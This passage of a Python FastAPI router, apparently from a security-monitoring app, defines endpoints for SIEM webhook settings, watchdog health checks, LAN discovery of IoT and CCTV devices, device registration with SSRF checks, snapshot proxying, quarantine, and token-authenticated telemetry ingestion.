    notifier = get_webhook_notifier(request)
    return make_response(data=notifier.get_config(), message="Webhook configuration retrieved.")


@router.post("/defense/webhook/config")
async def update_webhook_config(request: Request, payload: WebhookConfigRequest) -> Dict[str, Any]:
    """Updates outbound SIEM webhook settings with SSRF validation."""
    notifier = get_webhook_notifier(request)
    try:
        updated = notifier.update_config(
            url=payload.url,
            enabled=payload.enabled,
            webhook_format=payload.format,
        )
        return make_response(data=updated, message="Webhook configuration updated successfully.")
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc


@router.post("/defense/webhook/test")
async def test_webhook_connection(request: Request) -> Dict[str, Any]:
    """Sends a verification probe payload to the configured SIEM webhook."""
    notifier = get_webhook_notifier(request)
    try:
        result = await notifier.send_test_webhook()
        return make_response(data=result, message="Verification probe sent successfully to SIEM webhook.")
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc
    except Exception as exc:
        raise HTTPException(status_code=502, detail=f"Failed to deliver probe to webhook: {exc}") from exc


@router.get("/defense/watchdog/health")
async def get_watchdog_health(request: Request) -> Dict[str, Any]:
    """Returns detailed real-time health across all deception listeners, netfilter, and database."""
    watchdog = get_watchdog(request)
    health_data = await watchdog.check_all_listeners()
    return make_response(data=health_data, message="Watchdog health audit completed.")


@router.post("/defense/watchdog/drill")
async def execute_watchdog_drill(request: Request) -> Dict[str, Any]:
    """Executes an automated closed-loop defense verification drill and broadcasts results."""
    watchdog = get_watchdog(request)
    drill_report = await watchdog.run_verification_drill()
    return make_response(data=drill_report, message=drill_report.get("summary", "Verification drill completed."))


# --- Real-World IoT & CCTV Device Registry / Live Ingestion Routes ---

@router.get("/devices/subnets")
async def get_discovery_subnets_endpoint(request: Request) -> Dict[str, Any]:
    """Returns the primary detected LAN subnet and candidate subnets for discovery."""
    detector = get_detector(request)
    client_host = request.client.host if request.client else None
    default_sub, candidates = get_discovery_subnets_info(db=detector.db, client_host=client_host)
    return make_response(
        data={
            "default_subnet": default_sub,
            "candidate_subnets": candidates,
        }
    )


@router.post("/devices/discover")
async def discover_devices_on_lan(
    request: Request,
    payload: Optional[DeviceDiscoverRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Scans local network via ONVIF WS-Discovery and IoT port sweeps to auto-discover hardware."""
    subnet = payload.subnet if payload else None
    timeout = payload.timeout if payload else 2.0
    detector = get_detector(request)
    client_host = request.client.host if request.client else None
    resolved_sub = (
        subnet.strip()
        if (subnet and str(subnet).strip())
        else get_default_discovery_subnet(db=detector.db, client_host=client_host)
    )

    try:
        devices = await run_lan_discovery(
            subnet_cidr=resolved_sub,
            timeout=timeout,
            db=detector.db,
            client_host=client_host,
        )
        scanned_sub = getattr(devices, "scanned_subnet", "") or resolved_sub
        return make_response(
            data={"devices": devices, "count": len(devices), "scanned_subnet": scanned_sub},
            message=f"LAN discovery complete for {scanned_sub}. Found {len(devices)} candidate device(s).",
        )
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc
    except Exception as exc:
        logger.error("Error during LAN device discovery: %s", exc)
        return make_response(
            data={"devices": [], "count": 0, "scanned_subnet": subnet or ""},
            message=f"Discovery completed with 0 devices found: {exc}",
        )


@router.get("/devices")
async def list_registered_devices(request: Request) -> Dict[str, Any]:
    """Lists all onboarded real-world IoT and CCTV devices (excluding secrets)."""
    device_manager = get_device_manager(request)
    return make_response(data={"devices": device_manager.list_devices()})


@router.post("/devices")
async def register_real_device(payload: DeviceCreateRequest, request: Request) -> Dict[str, Any]:
    """Registers a physical IoT device or CCTV camera with strict SSRF and IP validation."""
    device_manager = get_device_manager(request)
    broadcaster = get_broadcaster(request)
    try:
        device = device_manager.register_device(
            device_id=payload.device_id,
            name=payload.name,
            device_type=payload.device_type,
            protocol=payload.protocol,
            ip_address=payload.ip_address,
            port=payload.port,
            mqtt_topic=payload.mqtt_topic,
            snapshot_url=payload.snapshot_url,
        )
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc

    public_device = {k: v for k, v in device.items() if k != "ingest_token"}
    await broadcaster.broadcast("device_registered", public_device)
    return make_response(
        data={"device": device},
        message=f"Device '{device['name']}' ({device['device_id']}) registered for Live Traffic monitoring.",
    )


@router.patch("/devices/{device_id}")
@router.put("/devices/{device_id}")
async def update_registered_device_name(
    device_id: str,
    payload: DeviceUpdateRequest,
    request: Request,
) -> Dict[str, Any]:
    """Updates the friendly display name of a registered IoT/CCTV device."""
    device_manager = get_device_manager(request)
    broadcaster = get_broadcaster(request)
    try:
        updated = device_manager.update_device_name(device_id, payload.name)
    except KeyError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc

    await broadcaster.broadcast("device_updated", updated)
    return make_response(
        data={"device": updated},
        message=f"Device '{device_id}' renamed to '{payload.name.strip()}'.",
    )


@router.delete("/devices/{device_id}")
async def delete_registered_device(device_id: str, request: Request) -> Dict[str, Any]:
    """Removes a registered physical IoT device from monitoring."""
    device_manager = get_device_manager(request)
    broadcaster = get_broadcaster(request)
    deleted = device_manager.delete_device(device_id)
    if not deleted:
        raise HTTPException(status_code=404, detail=f"Device '{device_id}' not found.")

    await broadcaster.broadcast("device_deleted", {"device_id": device_id})
    return make_response(data={"device_id": device_id}, message=f"Device '{device_id}' removed.")


@router.post("/devices/{device_id}/probe")
async def probe_real_device(device_id: str, request: Request) -> Dict[str, Any]:
    """Tests TCP reachability for a registered real-world IoT/CCTV device."""
    device_manager = get_device_manager(request)
    broadcaster = get_broadcaster(request)
    updated = await device_manager.probe_device(device_id)
    if not updated:
        raise HTTPException(status_code=404, detail=f"Device '{device_id}' not found.")

    await broadcaster.broadcast("device_updated", updated)
    return make_response(
        data={"device": updated},
        message=f"Reachability probe for {updated['name']} ({updated['ip_address']}:{updated['port']}): {updated['status']}.",
    )


@router.get("/devices/{device_id}/snapshot")
async def proxy_camera_snapshot(device_id: str, request: Request) -> Response:
    """Proxies a validated HTTP/HTTPS camera snapshot frame with strict SSRF & size checks."""
    device_manager = get_device_manager(request)
    try:
        image_bytes, media_type = await asyncio.to_thread(device_manager.fetch_snapshot_sync, device_id)
    except KeyError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc
    except PermissionError as exc:
        raise HTTPException(status_code=403, detail=str(exc)) from exc
    except ValueError as exc:
        raise HTTPException(status_code=400, detail=str(exc)) from exc
    except RuntimeError as exc:
        raise HTTPException(status_code=502, detail=str(exc)) from exc

    return Response(
        content=image_bytes,
        media_type=media_type,
        headers={
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "X-Content-Type-Options": "nosniff",
        },
    )


@router.post("/devices/{device_id}/block")
async def block_real_device(
    device_id: str,
    request: Request,
    payload: Optional[DeviceBlockRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Logically quarantines a physical IoT device, blocking ingestion and logging audit mitigation."""
    device_manager = get_device_manager(request)
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)
    reason = (payload.reason if payload and payload.reason else "Operator logical quarantine")
    try:
        result = device_manager.block_device(device_id, detector=detector, reason=reason)
    except KeyError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc

    await broadcaster.broadcast("device_updated", result["device"])
    await broadcaster.broadcast("mitigation_alert", result["mitigation"])
    return make_response(
        data=result,
        message=f"Logical quarantine enforced on '{result['device']['name']}'. Ingestion blocked.",
    )


@router.post("/devices/{device_id}/unblock")
async def unblock_real_device(
    device_id: str,
    request: Request,
    payload: Optional[DeviceBlockRequest] = Body(default=None),
) -> Dict[str, Any]:
    """Restores a logically quarantined physical IoT device and resumes telemetry ingestion."""
    device_manager = get_device_manager(request)
    detector = get_detector(request)
    broadcaster = get_broadcaster(request)
    admin_user = (payload.admin_user if payload and payload.admin_user else "soc_admin")
    try:
        result = device_manager.unblock_device(device_id, detector=detector, admin_user=admin_user)
    except KeyError as exc:
        raise HTTPException(status_code=404, detail=str(exc)) from exc

    await broadcaster.broadcast("device_updated", result["device"])
    await broadcaster.broadcast("mitigation_alert", result["mitigation"])
    return make_response(
        data=result,
        message=f"Device '{result['device']['name']}' restored to live monitoring.",
    )


@router.post("/devices/ingest/{device_id}")
async def ingest_real_device_webhook(
    device_id: str,
    payload: DeviceIngestRequest,
    request: Request,
    x_device_token: Optional[str] = Header(default=None, alias="X-Device-Token"),
) -> Dict[str, Any]:
    """Authenticated HTTP webhook ingestion endpoint for external IoT hardware & NVR/camera alerts."""
    device_manager = get_device_manager(request)
    broadcaster = get_broadcaster(request)

    existing = device_manager.get_device(device_id)
    if not existing:
        raise HTTPException(status_code=404, detail=f"Registered device '{device_id}' not found.")

    if not x_device_token or not device_manager.verify_ingest_token(device_id, x_device_token):
        raise HTTPException(status_code=401, detail="Invalid or missing X-Device-Token authentication header.")

    if existing.get("blocked"):
        await broadcaster.broadcast("device_telemetry_blocked", {
            "device_id": device_id,
            "name": existing["name"],
            "ip_address": existing["ip_address"],
            "topic": f"http/webhook/{device_id}",
            "channel": "HTTP_WEBHOOK",
        })
        raise HTTPException(
            status_code=403,
            detail=f"Device '{device_id}' is quarantined/blocked by SOC policy. Payload dropped.",
        )

    payload_str = json.dumps(payload.payload)
    updated = device_manager.record_device_telemetry(device_id, payload_str)
    if updated:
        await broadcaster.broadcast("device_updated", updated)
    await broadcaster.broadcast("iot_telemetry", {
        "topic": f"http/webhook/{device_id}",
        "payload": payload_str,
        "timestamp": time.time(),
        "device_id": device_id,
        "device_name": existing["name"],
        "mode": getattr(request.app.state, "traffic_mode", "simulated"),
    })
    return make_response(data={"device": updated}, message="Live device telemetry ingested.")

